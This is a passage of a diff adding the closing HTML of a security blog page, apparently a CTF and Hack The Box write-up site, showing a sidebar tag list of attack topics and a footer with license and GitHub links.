+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
